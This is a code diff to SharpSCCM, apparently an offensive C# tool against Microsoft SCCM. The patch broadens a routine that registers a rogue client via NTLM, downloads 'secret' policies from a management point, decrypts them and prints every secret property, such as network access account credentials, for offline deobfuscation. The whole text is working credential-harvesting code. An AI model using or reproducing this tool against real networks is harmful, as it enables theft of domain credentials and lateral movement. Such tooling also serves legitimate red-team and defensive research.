@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Linq;
 using System.Net;
 using System.Net.Http;
 using System.Security.Cryptography;
@@ -52,7 +53,7 @@ namespace SharpSCCM
             return certificate;
         }
 
-        public static string DecryptPolicyBody(byte[] policyDownloadResponseBytes)
+        public static string DecryptPolicyBody(byte[] policyDownloadResponseBytes, MessageCertificateX509 encryptionCertificate)
         {
             // Parse response ASN1 and decrypt contents
             ContentInfo contentInfo = new ContentInfo(policyDownloadResponseBytes);
@@ -61,7 +62,8 @@ namespace SharpSCCM
             RecipientInfo encryptedKey = pkcs7EnvelopedCms.RecipientInfos[0];
             try
             {
-                pkcs7EnvelopedCms.Decrypt(encryptedKey);
+                //pkcs7EnvelopedCms.Decrypt(encryptedKey);
+                pkcs7EnvelopedCms.Decrypt(encryptedKey, new X509Certificate2Collection(encryptionCertificate.X509Certificate));
                 Console.WriteLine($"[+] Successfully decoded and decrypted secret policy");
                 string decryptedPolicyBody = Encoding.ASCII.GetString(pkcs7EnvelopedCms.ContentInfo.Content).Replace("\0", string.Empty);
                 return decryptedPolicyBody;
@@ -88,7 +90,7 @@ namespace SharpSCCM
             return certificate;
         }
 
-        public static async void GetNetworkAccessAccounts(string managementPoint, string siteCode, string username = null, string password = null, string outputPath = null, bool cert = false)
+        public static async void GetSecretsFromPolicy(string managementPoint, string siteCode, string username = null, string password = null, string outputPath = null, bool cert = false)
         {
             // Thanks to Adam Chester(@_xpn_) for figuring this out! https://blog.xpnsec.com/unobfuscating-network-access-accounts/
             // Register a new client using NTLM authentication for the specified machine account to automatically approve the new device record, allowing secret policy retrieval
@@ -121,7 +123,8 @@ namespace SharpSCCM
             ConfigMgrPolicyAssignmentReply assignmentReply = SendPolicyAssignmentRequest(clientId, signingCertificate, managementPoint, siteCode);
 
             // Get secret policies
-            string output = null;
+            string outputFull = "";
+            string outputCreds = "";
             foreach (PolicyAssignment policyAssignment in assignmentReply.ReplyAssignments.PolicyAssignments)
             {
                 if (policyAssignment.Policy.Flags.ToString().Contains("Secret"))
@@ -133,30 +136,23 @@ namespace SharpSCCM
 
                     // Can't figure out how to authenticate with the SDK so using raw HTTP requests
                     string policyURL = policyAssignment.Policy.Location.Value.Replace("<mp>", managementPoint);
-                    HttpResponseMessage policyDownloadResponse = SendPolicyDownloadRequest(policyURL, clientId.ToString(), signingCertificate);
+                    HttpResponseMessage policyDownloadResponse = SendPolicyDownloadRequest(policyURL, clientId.ToString(), encryptionCertificate);
                     byte[] policyDownloadResponseBytes = await policyDownloadResponse.Content.ReadAsByteArrayAsync();
                     Console.WriteLine($"[+] Received encoded response from server for policy {policyAssignment.Policy.Id}");
-                    string decryptedPolicyBody = DecryptPolicyBody(policyDownloadResponseBytes);
+                    string decryptedPolicyBody = DecryptPolicyBody(policyDownloadResponseBytes, encryptionCertificate);
                     if (decryptedPolicyBody != null)
                     {
-                        output += decryptedPolicyBody;
-                        // Delete the created certificate from the current user store
-                        if (!cert)
-                        {
-                            DeleteCertificate(signingCertificate);
-                        }
-
+                        outputFull += decryptedPolicyBody;
                         XmlDocument policyXmlDoc = new XmlDocument();
                         policyXmlDoc.LoadXml(decryptedPolicyBody.Trim().Remove(0, 2));
-                        string encryptedUsername = policyXmlDoc.SelectSingleNode("//instance").FirstChild.NextSibling.InnerText;
-                        string encryptedPassword = policyXmlDoc.SelectSingleNode("//instance").FirstChild.NextSibling.NextSibling.InnerText;
-                        Console.WriteLine($"[+] Encrypted NAA username: {encryptedUsername}");
-                        Console.WriteLine($"[+] Encrypted NAA password: {encryptedPassword}");
-                    }
-
-                    if (decryptedPolicyBody.Contains("NetworkAccess"))
-                    {
-
+                        XmlNodeList propertyNodeList = policyXmlDoc.GetElementsByTagName("property");
+                        foreach (XmlNode propertyNode in propertyNodeList)
+                        {
+                            if (propertyNode.Attributes["secret"] != null)
+                            {
+                                outputCreds += $"{propertyNode.Attributes["name"].Value}: {propertyNode.InnerText.Trim()}\n\n";
+                            }
+                        }
                     }
 
                     /*
@@ -171,14 +167,22 @@ namespace SharpSCCM
                     */
                 }
             }
+            // Delete the created certificate from the current user store
+            if (!cert)
+            {
+                DeleteCertificate(signingCertificate);
+            }
 
             if (!string.IsNullOrEmpty(outputPath))
             {
-                File.WriteAllText(outputPath, output);
+                File.WriteAllText(outputPath, outputFull);
                 Console.WriteLine($"[+] Wrote secret policies to {outputPath}");
             }
+
+            Console.WriteLine($"[+] Encrypted secrets:\n\n{outputCreds.TrimEnd()}\n");
+
             // Thanks to Evan McBroom for reversing and writing this decryption routine! https://gist.github.com/EvanMcBroom/525d84b86f99c7a4eeb4e3495cffcbf0
-            Console.WriteLine("[+] Done! Encrypted NAA hex strings can be decrypted offline using the \"DeobfuscateNAAString.exe <string>\" command");
+            Console.WriteLine("[+] Done! Encrypted hex strings can be decrypted offline using the \"DeobfuscateSecretString.exe <string>\" command");
         }
 
         public static MessageCertificateX509 GetMachineSigningCertificate()
